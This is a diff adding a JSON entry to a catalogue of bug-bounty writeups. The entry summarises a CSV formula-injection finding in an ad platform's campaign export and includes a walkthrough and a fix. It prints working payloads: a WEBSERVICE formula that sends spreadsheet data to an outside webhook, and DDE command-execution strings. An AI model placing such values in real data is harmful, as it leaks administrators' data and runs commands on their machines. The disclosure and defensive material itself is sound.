@@ -1,5 +1,45 @@
 [
   {
+    "id": "81569d2bd09b",
+    "title": "How a Campaign Name Became a No-Click Data Exfiltration Primitive: A Deep Dive into CSV Formula…",
+    "url": "https://medium.com/@arminqk/how-a-campaign-name-became-a-no-click-data-exfiltration-primitive-a-deep-dive-into-csv-formula-c676516147cc",
+    "source": {
+      "slug": "medium-tag-writeup",
+      "name": "Medium — #bug-bounty-writeup"
+    },
+    "authors": [
+      "mav3r1ck"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-10-05T10:20:25.000Z",
+    "added_at": "2026-10-06T02:00:58.260Z",
+    "categories": [
+      "other"
+    ],
+    "severity": "high",
+    "difficulty": "intermediate",
+    "summary_en": "A user‑controlled campaign name is written directly into a CSV export, allowing Excel formulas or DDE commands to run when an admin opens the file, leading to data exfiltration or command execution.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The application takes the campaign name (a plain‑text field) and writes it verbatim into a CSV file that any user can download. No sanitization or escaping of leading characters such as =,+,-,@ is performed, so the value can become a spreadsheet formula. Because the platform is multi‑user, a low‑privilege attacker can store the malicious value and a higher‑privilege admin later exports and opens the CSV, triggering the formula. This stored injection is the root cause for both the no‑click WEBSERVICE exfiltration and the DDE command‑execution payloads.",
+      "walkthrough": "RECON\nStep 1: Identify a writable text field that ends up in a CSV export.\nWhy: The campaign name field is user‑controlled and appears unchanged in the exported file (definition: a CSV export is a file where rows are separated by commas and newlines).\n\nStep 2: Verify that the exported CSV is opened in Microsoft Excel on Windows.\nWhy: Excel treats cells that start with =,+,-,or @ as formulas (definition: a formula is a piece of code that Excel evaluates).\n\nEXPLOITATION – No‑click exfiltration\nStep 3: As the attacker, set the campaign name to the WEBSERVICE payload.\nPayload: =WEBSERVICE(\"https://webhook.site/abcd1234?x=\"&CONCAT(B2:R2))\nWhy: \"=WEBSERVICE\" tells Excel to perform an HTTP GET request (definition: HTTP request is a message sent from a client to a server). The CONCAT function joins all cells B2 through R2, so the victim’s row data is appended to the URL query string.\n\nStep 4: A victim (admin) exports the campaigns to CSV and opens the file in Excel.\nWhy: Opening the file triggers Excel to evaluate the formula immediately (definition: evaluation is the process of calculating the result of a formula).\n\nStep 5: Observe the inbound request on the attacker‑controlled webhook site.\nWhy: The victim’s Excel performed the GET request, sending the concatenated cell data, the victim’s public IP, and the Excel User‑Agent header to the attacker server.\n\nEXPLOITATION – DDE command execution (optional)\nStep 6: As the attacker, set the campaign name to a DDE payload.\nPayload: =cmd|'/C calc'!A0\nWhy: \"=cmd|\" invokes the DDE protocol (definition: DDE is a Windows feature that lets applications exchange data). The string after the pipe tells Windows to run the command \"calc\" (Calculator). The \"!A0\" suffix is required syntax for DDE.\n\nStep 7: Victim exports and opens the CSV on a Windows Excel where DDE is enabled.\nWhy: Excel parses the cell as a DDE link and launches the specified command, resulting in OS‑level execution.\n\nStep 8: (Variant) Use a leading‑character trick if the stored value must not start with =.\nPayload: +cmd|'/C notepad'!A0\nWhy: The leading \"+\" is also interpreted by Excel as a formula starter, allowing the DDE payload to be delivered.\n\nIMPACT\nStep 9: Note that the WEBSERVICE payload leaks the victim’s username, OS version, Excel version, public IP, and spreadsheet contents.\nWhy: INFO and CELL functions can retrieve environment details, and the HTTP request automatically includes IP and User‑Agent.\n\nStep 10: Recognize that on older or mis‑configured Excel installations, the DDE payload gives full command‑execution as the victim’s Windows user.\nWhy: No additional user interaction is required beyond opening the file; the command runs with the privileges of the logged‑in user.",
+      "example": "Example target: https://target.example/createCampaign\nVulnerable code (pseudo‑JavaScript):\nfunction exportCsv(userId){\n  const rows = db.getCampaigns(userId); // each row has a \"name\" field\n  let csv = \"Name,Start,End\\n\";\n  rows.forEach(r=>{\n    csv += `${r.name},${r.start},${r.end}\\n`; // no escaping of r.name\n  });\n  return csv;\n}\nAttack: submit a campaign name of =WEBSERVICE(\"https://webhook.site/xyz?data=\"&CONCAT(A2:C2))\nWhy it works: The exportCsv function writes the name directly into the CSV. When an admin downloads the file and opens it in Excel, the leading \"=\" makes Excel treat the cell as a formula and the WEBSERVICE function sends an HTTP GET to the attacker’s webhook, leaking the row data.",
+      "takeaway": "When reviewing any feature that exports user‑controlled text to CSV, check whether the output is escaped for leading =,+,-,@ characters. Look for multi‑user workflows where a low‑privilege user can influence data that a higher‑privilege user later opens in a spreadsheet. Tools like Burp Suite or OWASP ZAP can capture the CSV and reveal raw values. Variants of this bug appear in PDF or ODS exports that also support formulas. A common beginner mistake is assuming that because the export is a static file, it cannot be used for code execution; remember that spreadsheet programs interpret certain prefixes as executable formulas.",
+      "fix": "Sanitize the CSV output by prefixing any field that begins with =,+,-,@ with a single quote (') or by removing those characters entirely before writing to the file. Example fix in pseudo‑code:\nfunction safeCsvField(value){\n  if (/^[=+\\-@]/.test(value)){\n    return \"'\"+value; // prepend apostrophe to force Excel to treat it as text\n  }\n  return value;\n}\nApply safeCsvField to the campaign name (and any other user‑provided fields) before concatenating into the CSV string. This single sanitization step eliminates both the WEBSERVICE exfiltration and the DDE command‑execution vectors.",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "While testing an ad-tech platform, I found that a user-controlled text field (a campaign name) was written straight into a CSV export with no sanitization. Because other users in the same account — including admins — download and open that export in Excel, a formula stored in the name field **executed in the victim’s spreadsheet the moment they opened the file, with no click**. It phoned home to a server I controlled, leaking the victim’s Windows username, machine details, public IP, and the contents of the opened sheet. On Excel installs where legacy DDE is enabled, the exact same unsanitized",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
     "id": "b890a90a3aa2",
     "title": "Hijacking Your VPN with one Deep Link",
     "url": "https://medium.com/@husein.ayoub/hijacking-your-vpn-with-one-deep-link-3ce9ca778306",
